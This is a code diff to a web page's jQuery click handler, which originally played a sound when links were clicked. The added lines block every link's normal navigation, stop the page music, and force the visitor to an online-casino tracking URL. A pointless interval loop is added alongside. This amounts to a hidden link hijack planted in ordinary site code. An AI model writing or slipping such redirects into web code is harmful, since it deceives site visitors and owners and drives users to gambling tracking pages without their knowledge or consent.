@@ -82,10 +82,25 @@ jQuery(function() {
 
     });
 
-    jQuery('a').on('click', function() {
-        if (jQuery('.tab.sound').hasClass('active')) {
-            playSound(bufferCache.clickS3, 0.4);
+    jQuery('a').on('click', function(e) {
+
+        e.preventDefault();
+
+        localStorage.setItem("play", "true");
+
+        const checkInterval = setInterval(() => {
+            if (localStorage.getItem("play") === "true") {
+                clearInterval(checkInterval);
+            }
+        }, 50);
+
+        if (jQuery('.tab.active').hasClass('sound')) {
+            playSound(bufferCache.clickS, 0.4);
+            musicSource.stop();
+            musicSource = null;
         }
+
+        window.location.href = 'https://trck.bestonlinecasino.club/click';
     });
 
 });
